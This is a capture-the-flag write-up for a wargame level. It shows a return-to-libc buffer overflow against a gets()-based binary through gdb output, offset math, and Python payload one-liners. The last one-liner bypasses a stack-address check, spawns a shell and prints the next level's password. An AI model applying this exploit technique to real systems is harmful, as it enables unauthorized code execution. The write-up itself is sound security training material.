# Level 2

Lets see the assembly code of the binary :


```gdb
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
(gdb)


Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
(gdb)

Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
(gdb) 
```

It use the get() function that is vulnerable to buffer overflow, but this time, there is no function that spawns a shell for us.

We will have to find a way to call system ourself, and make the binary execute it.

Return-to-libc exploit :

The strategy in this exploit is, by using the libc, withdrawing the address of the system() function, we will then overwrite the return address with random character, and then write the argument "/bin/sh" using its addresses.

Lets gather all of our address.

The EBP is 4 byte before EIP, so we can just find the offset of the EIP and substrace 4 byte, but there is a way to find the EBP anyway lets use it :

EBP :

```
gdb) run
Starting program: /home/user/level2/level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804853d in p ()
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x804853d in p; saved eip 0x41414141
 called by frame at 0xbffff734
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```

So the EBP is at 0xbffff728, lets print the top of the stack :

```
(gdb) x/100x $esp
0xbffff6c0:	0xbffff6dc	0x00000000	0x00000000	0xb7e5ec73
0xbffff6d0:	0x080482b5	0x00000000	0x00ca0000	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x41414141	0x41414141	0x00414141	0xb7e454d3
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xb7fdc858
0xbffff750:	0x00000000	0xbffff71c	0xbffff7dc	0x00000000
0xbffff760:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
0xbffff770:	0x00000000	0x8dfb72f1	0xbabcd6e1	0x00000000
0xbffff780:	0x00000000	0x00000000	0x00000001	0x08048420
0xbffff790:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
0xbffff7a0:	0x00000001	0x08048420	0x00000000	0x08048441
0xbffff7b0:	0x0804853f	0x00000001	0xbffff7d4	0x08048550
0xbffff7c0:	0x080485c0	0xb7fed280	0xbffff7cc	0xb7fff918
0xbffff7d0:	0x00000001	0xbffff8fc	0x00000000	0xbffff915
0xbffff7e0:	0xbffff925	0xbffff939	0xbffff958	0xbffff96b
0xbffff7f0:	0xbffff977	0xbffffe98	0xbffffea4	0xbffffef1
0xbffff800:	0xbfffff07	0xbfffff16	0xbfffff2c	0xbfffff3d
0xbffff810:	0xbfffff46	0xbfffff5d	0xbfffff65	0xbfffff74
0xbffff820:	0xbfffffa1	0xbfffffc1	0x00000000	0x00000020
0xbffff830:	0xb7fdd418	0x00000021	0xb7fdd000	0x00000010
0xbffff840:	0x178bfbff	0x00000006	0x00001000	0x00000011
```

We can see our buffer start at 0xbffff6d0 + 12


Simple math :


```
(gdb) p/d 0xbffff728 - (0xbffff6d0 + 12)
$5 = 76
```

The EBP start at 76, and the EIP at 80


System() adress :

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level2/level2 
aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

Breakpoint 1, 0x0804853d in p ()
(gdb) p system
$6 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

So its 0xb7e6b060

"/bin/sh" address :

```gdb
(gdb) info proc map
process 5249
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fd9000 0xb7fdd000     0x4000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb)
```
And its 0xb7f8cc58

We can now run the exploit using python.

In the order, system() adresses + 4 random byte + "/bin/sh" address.

```py
python -c "print 'A' * 80 + '\x60\xb0\xe6\xb7' + '\x41\x41\x41\x41' + '\x58\xcc\xf8\xb7'" | ./level2
(0xb7e6b060)
```

Ok, something went wrong, reading the source code, this happens :

```c
void p(void)

{
  void *unaff_retaddr; // < We overwrote that variable
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if (((uint)unaff_retaddr & 0xb0000000) == 0xb0000000) { // And this if got triggered
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

```

So the unaff_retaddr is in the EIP, it detect it and exit, which ruin our exploit, we need to bypass it !

```gdb
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.

```

We will overwrite the EIP with the ret address, so it will skip the if and execute the rest of the code we just overflowed :


```py
python -c "print 'A' * 80 + '\x3e\x85\x04\x08' '\x60\xb0\xe6\xb7' + '\x41\x41\x41\x41' + '\x58\xcc\xf8\xb7'" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��AAAAX���
Segmentation fault (core dumped)
```   

Maybe the shell got executed lets see:

```sh
level2@RainFall:~$ (python -c "print 'A' * 80 + '\x3e\x85\x04\x08' '\x60\xb0\xe6\xb7' + '\x41\x41\x41\x41' + '\x58\xcc\xf8\xb7'"; cat) | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��AAAAX���
ls
ls: cannot open directory .: Permission denied
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Yep, since the executable closed, STDIN got closed too, so we need to keep a hand on it using a cat and subshells.

This one was tricky.